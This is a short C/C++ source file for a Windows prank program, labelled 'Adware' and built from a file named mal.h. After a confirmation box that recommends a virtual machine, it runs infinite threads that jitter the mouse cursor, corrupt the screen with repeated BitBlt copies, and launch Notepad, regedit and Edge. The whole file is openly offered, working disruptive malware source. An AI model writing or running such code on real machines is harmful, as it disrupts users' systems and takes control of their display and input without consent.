#include "mal.h"

DWORD WINAPI Mouse(LPVOID lpParam){
	srand((unsigned int)time(NULL));
    POINT p;

    while (true)
    {
        GetCursorPos(&p);

        if (rand() % 5 == 0)
        {
            int dx = (rand() % 3) - 1;
            int dy = (rand() % 3) - 1;
            SetCursorPos(p.x + dx, p.y + dy);
        }
        Sleep(1);

    }
}
DWORD WINAPI GDIEFFECT(LPVOID lpParam)
{
	while(true)
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics (1);
		BitBlt(hdc, rand() % 10, rand() % 10, rand() % w, rand() % h, hdc, rand() % 12, rand() % 12, SRCCOPY);
	}
}
DWORD WINAPI GDIEFFECT2(LPVOID lpParam)
{
	while(true)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, 10, 10, w, h, hdc, 12, 12, SRCINVERT);
	}
}
DWORD WINAPI ADS(LPVOID lpParam)
{
	system("start Notepad.exe");
	system("start regedit.exe");
	system("start msedge.exe");
}
int main()
{
	if (MessageBox(NULL, "Run Malware? You should Probably try on a Virtual Machine.", "Adware;", MB_YESNO | MB_ICONWARNING) == IDNO)
	{
		return false;
	}
	
	CreateThread(0, 0, Mouse, 0, 0, 0);
	CreateThread(0, 0, GDIEFFECT, 0, 0, 0);
	CreateThread(0, 0, ADS, 0, 0, 0);
	Sleep(INFINITE);
}

